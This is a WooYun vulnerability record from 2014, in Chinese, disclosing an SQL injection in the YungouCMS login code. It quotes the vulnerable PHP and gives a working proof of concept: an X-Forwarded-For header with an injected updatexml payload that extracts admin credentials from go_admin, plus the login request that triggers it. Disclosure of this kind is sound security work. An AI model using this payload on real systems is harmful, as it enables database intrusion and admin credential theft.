{"id": 54664, "wybug_id": "wooyun-2014-063747", "wybug_title": "yungoucms一处sql注入漏洞", "wybug_corp": "yungoucms.com", "wybug_author": "酱油甲", "wybug_date": "2014-06-06 16:09", "wybug_open_date": "2014-09-01 16:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向公众公开  简要描述： yungoucms一处sql注入漏洞 详细说明：  云购CMS一处SQL注入漏洞问题文件/system/modules/member/user.action.php\npublic function login(){\t\t\t$user = $this->userinfo;\t\t\tif($user){\t\t\theader(\"Location:\".G_WEB_PATH);exit;\t\t}else if(!$this->segment(4)){\t\t\t\t\t\tglobal $_cfg;\t\t\t\t\t\t\t$url = WEB_PATH.'/'.$_cfg['param_arr']['url'];\t\t\t\t\t\t$url = rtrim($url,'/');\t\t\t\t$url .= '/'.base64_encode(trim(G_HTTP_REFERER));\t\t\t\tif($url != get_web_url()){\t\t\t\t\theader(\"Location:\".$url);exit;\t\t\t}\t\t}\t\t\t\tif(isset($_POST['submit'])){\t\t\t\t\t$username=$_POST['username'];\t\t\t$password=md5($_POST['password']);\t\t\t$logintype='';\t\t\tif(strpos($username,'@')==false){\t\t\t\t//手机\t\t\t\t\t\t\t\t$logintype='mobile';\t\t\t\tif(!_checkmobile($username)){\t\t\t\t\t_message(\"手机格式不正确!\");\t\t\t\t}\t\t\t\t\t\t\t}else{\t\t\t\t//邮箱\t\t\t\t$logintype='email';\t\t\t\tif(!_checkemail($username)){\t\t\t\t\t_message(\"邮箱格式不正确!\");\t\t\t\t}\t\t\t}\t\t\t$member=$this->db->GetOne(\"select * from `@#_member` where `$logintype`='$username' and `password`='$password'\");\t\t\tif(!$member){\t\t\t\t_message(\"帐号不存在错误!\");\t\t\t}\t\t\t\t\t$check=$logintype.'code';\t\t\tif($member[$check] != 1){\t\t\t\t$strcode=_encrypt($member['email']);\t\t\t\t_message(\"帐号未认证\",WEB_PATH.\"/member/user/\".$logintype.\"check/\"._encrypt($member[$logintype]));\t\t\t}\t\t\t\t\t\t\t\t\tif(!is_array($member)){\t\t\t\t_message(\"帐号或密码错误\",NULL,3);\t\t\t}else{\t\t\t\t$user_ip = _get_ip_dizhi();\t\t\t\t$this->db->GetOne(\"UPDATE `@#_member` SET `user_ip` = '$user_ip' where `uid` = '$member[uid]'\");\t\t\t\t_setcookie(\"uid\",_encrypt($member['uid']),60*60*24*7);\t\t\t\t\t\t\t_setcookie(\"ushell\",_encrypt(md5($member['uid'].$member['password'].$member['mobile'].$member['email'])),60*60*24*7);\t\t\t\t\t\t\t}\t\t\t\t\t\t_message(\"登录成功\",base64_decode($this->segment(4)),2);\t\t\t\t\t\t}\t\t\tinclude templates(\"user\",\"login\");\t\t\t}\n这里$user_ip = _get_ip_dizhi();我们看下这个函数：\nfunction _get_ip_dizhi(){\t\t$opts = array(\t\t\t'http'=>array(\t\t\t'method'=>\"GET\",\t\t\t'timeout'=>5,)\t\t);\t\t\t\t$context = stream_context_create($opts); \t\t$ipmac=_get_ip();\t\tif(strpos($ipmac,\"127.0.0.\") === true)return '';\t\t$url_ip='http://ip.taobao.com/service/getIpInfo.php?ip='.$ipmac;\t\t$str = @file_get_contents($url_ip, false, $context);\t\tif(!$str) return \"\";\t\t$json=json_decode($str,true);\t\tif($json['code']==0){\t\t\t$ipcity= $json['data']['region'].$json['data']['city'];\t\t\t$ip= $ipcity.','.$ipmac;\t\t}else{\t\t\t$ip=\"\";\t\t}\t\treturn $ip;}\n需要if($json['code']==0)我们看下http://ip.taobao.com/service/getIpInfo.php?ip=发现只有ip为规则的code才为0，那么怎么办呢？大家应该想到了，对的，多参数，就是使用&于是我们构造POC:x-forwarded-for: 8.8.8.8&', `mobile`=(updatexml(1,concat(0x5e24,(select concat(username,0x23,userpass) from go_admin limit 0,1),0x5e24),1))-- -然后找个能用的帐号登陆一下就是了http://localhost/yungoucms/?/member/user/login/post:submit=1&username=123456@qq.com&password=123123官网测试站点不让修改数据库，没办法，只能本地测了   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 酱油甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-01 16:10 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}